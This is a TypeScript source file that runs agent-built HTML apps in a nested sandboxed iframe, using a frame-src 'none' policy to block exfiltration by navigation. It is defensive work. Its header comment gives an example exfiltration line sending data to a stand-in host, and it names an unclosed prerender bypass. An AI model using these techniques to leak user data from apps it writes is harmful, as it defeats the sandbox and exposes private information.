/**
 * Agent HTML apps — the frame the app runs in.
 *
 * The app does not sit in the host's iframe directly. The host's iframe holds a small wrapper
 * document, and the wrapper holds the app in a nested iframe. Two holes close this way:
 *
 * - Exfiltration by navigation. A sandboxed frame can always navigate itself
 *   (`location.href = "https://x/?d=" + data`, a meta refresh, a `data:` hop), and neither sandbox
 *   flags nor the app's own CSP govern that. The wrapper's `frame-src 'none'` does: a frame's
 *   navigations are checked against the policy of the document that embeds it, so every load
 *   after the app's own srcdoc is refused before a request leaves. Verified in Chrome against
 *   these exact flags.
 * - A live bridge on a foreign page. The `hello` carrying the bridge port has to go to `"*"` (an
 *   opaque origin has no name `postMessage` accepts), so whatever document sits in the frame
 *   when it is sent receives the port. The wrapper forwards the port once, to the app's first
 *   load, and reports any later load to the host as {@link FrameNavigated} instead. If the app
 *   navigates before its own load finishes, the first load is the replacement; under
 *   `frame-src 'none'` that can only be an error page or an `about:blank` / `javascript:`
 *   document the app made itself, in its own origin and under the inherited policy, so it holds
 *   nothing the app did not.
 *
 * The app srcdoc inherits the wrapper's policy, which is {@link RUN_CSP} plus `frame-src`, so the
 * policy holds even for a document the app swaps in with a `javascript:` URL.
 *
 * Not closed: Chrome's `<link rel="prerender">` prefetch ignores CSP (even on a top-level page),
 * so an app can still send one request per load with data in its URL. No policy stops it, and
 * stripping the tag would not stop a script adding it, so the grant sheet says the app may be
 * able to send out what it reads.
 */

// Old-style code on purpose: the body below is shipped as a string into a foreign document.
/* eslint-disable no-var, @typescript-eslint/prefer-for-of */

import {BRIDGE_VERSION, RUN_CSP, SANDBOX_FLAGS} from "./protocol"

/** CSP of the wrapper document. `frame-src 'none'` is the navigation guard; srcdoc still loads. */
export const RUN_FRAME_CSP = `${RUN_CSP}; frame-src 'none'; object-src 'none'`

/** Wrapper → host: the app's frame loaded a second document. The app is stopped. */
export interface FrameNavigated {
    v: typeof BRIDGE_VERSION
    type: "frame-navigated"
}

export function isFrameNavigated(x: unknown): x is FrameNavigated {
    return (
        typeof x === "object" &&
        x !== null &&
        (x as {v?: unknown}).v === BRIDGE_VERSION &&
        (x as {type?: unknown}).type === "frame-navigated"
    )
}

/**
 * The wrapper body. Same constraints as the stub: self-contained, plain ES2017, since it runs as
 * `(fn)(html, flags, version)` in a foreign document.
 */
function runFrame(html: string, flags: string, version: number): void {
    var loads = 0
    var stopped = false
    var forwarded = false
    var pending: {data: unknown; port: MessagePort} | null = null

    var frame = document.createElement("iframe")
    frame.setAttribute("sandbox", flags)
    frame.setAttribute("title", "App")
    frame.setAttribute("style", "display:block;width:100%;height:100%;border:0")

    function forward(): void {
        if (stopped || forwarded || !pending || loads !== 1 || !frame.contentWindow) return
        forwarded = true
        frame.contentWindow.postMessage(pending.data, "*", [pending.port])
        pending = null
    }

    function stop(): void {
        stopped = true
        if (pending) pending.port.close()
        pending = null
        if (frame.parentNode) frame.parentNode.removeChild(frame)
        window.parent.postMessage({v: version, type: "frame-navigated"}, "*")
    }

    frame.onload = function () {
        loads += 1
        if (loads === 1) forward()
        else if (!stopped) stop()
    }

    window.addEventListener("message", function (event: MessageEvent) {
        var ports = event.ports
        // Only the host speaks to the wrapper, and only once: one hello, one port.
        var accept =
            event.source === window.parent &&
            !stopped &&
            !forwarded &&
            !pending &&
            !!event.data &&
            (event.data as {type?: unknown}).type === "hello" &&
            !!ports &&
            ports.length === 1
        if (!accept) {
            if (ports) for (var i = 0; i < ports.length; i++) ports[i].close()
            return
        }
        pending = {data: event.data, port: ports[0]}
        forward()
    })

    frame.srcdoc = html
    document.body.appendChild(frame)
}

/** A string safe to inline as a JS literal inside `<script>`. */
const scriptLiteral = (value: string): string =>
    JSON.stringify(value)
        .replace(/</g, "\\u003c")
        .replace(/\u2028/g, "\\u2028")
        .replace(/\u2029/g, "\\u2029")

/** The wrapper's script: builds the app frame and relays the one hello. */
export function buildRunFrameScript(appHtml: string): string {
    return `(${runFrame.toString()})(${scriptLiteral(appHtml)}, ${scriptLiteral(SANDBOX_FLAGS)}, ${BRIDGE_VERSION})`
}

/** The wrapper document for an assembled app document. Set it as the host iframe's srcdoc. */
export function buildRunFrame(appHtml: string): string {
    return (
        "<!doctype html><html><head>" +
        `<meta http-equiv="Content-Security-Policy" content="${RUN_FRAME_CSP}">` +
        "<style>html,body{margin:0;height:100%;overflow:hidden}</style>" +
        `</head><body><script>${buildRunFrameScript(appHtml)}</script></body></html>`
    )
}
